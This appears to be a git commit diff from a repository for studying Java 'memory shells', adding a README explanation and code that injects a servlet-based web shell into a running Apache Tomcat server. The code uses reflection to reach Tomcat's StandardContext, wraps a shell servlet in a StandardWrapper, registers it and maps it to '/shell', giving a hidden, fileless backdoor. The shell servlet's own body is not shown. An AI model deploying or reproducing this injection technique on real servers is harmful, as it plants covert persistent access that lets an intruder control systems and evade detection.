ccd391ed83cb4c0f0827cb65c243582e563e577e
safe6Sec <1850597152@qq.com>
2022-03-28 18:20:05 +0800

    add servletShell

--- README.md
+++ README.md
@@ -1,2 +1,11 @@
 # MemoryShell
 内存马学习
+
+
+# 目录
+
+## servlet马
+原理：
+创建servlet马封装成wrapper，获取StandardContext使用addChild添加内存马，最后配置映射关系。
+详细步骤见代码。
+![](img/servlet.png)
--- src/main/java/cn/safe6/servlet/AddShellServlet.java
+++ src/main/java/cn/safe6/servlet/AddShellServlet.java
@@ -1,6 +1,10 @@
 package cn.safe6.servlet;
 
 import javafx.application.Application;
+import org.apache.catalina.Wrapper;
+import org.apache.catalina.core.ApplicationContext;
+import org.apache.catalina.core.StandardContext;
+import org.apache.catalina.core.StandardWrapper;
 
 import javax.servlet.ServletContext;
 import javax.servlet.ServletException;
@@ -17,13 +21,34 @@ public class AddShellServlet extends HttpServlet {
     @Override
     protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
 
-        ServletContext servletContext = req.getServletContext();
         try {
+            //先拿到ServletContext
+            ServletContext servletContext = req.getServletContext();
             Field appctx =servletContext.getClass().getDeclaredField("context");
             appctx.setAccessible(true);
 
-            //ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
-            //Application
+            //从ServletContext里面拿到ApplicationContext
+            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
+            Field atx= applicationContext.getClass().getDeclaredField("context");
+            atx.setAccessible(true);
+            //从ApplicationContext里面拿到StandardContext
+            StandardContext standardContext = (StandardContext) atx.get(applicationContext);
+
+            //准备内存马
+            ServletShell shell = new ServletShell();
+
+            //用wrapper包装内存马
+            Wrapper wrapper = new StandardWrapper();
+            wrapper.setServlet(shell);
+            wrapper.setName("shell");
+            wrapper.setLoadOnStartup(1);
+            wrapper.setServletClass(shell.getClass().getName());
+
+            //添加到标准上下文
+            standardContext.addChild(wrapper);
+
+            //添加映射关系
+            standardContext.addServletMappingDecoded("/shell","shell");
 
 
         } catch (Exception e) {
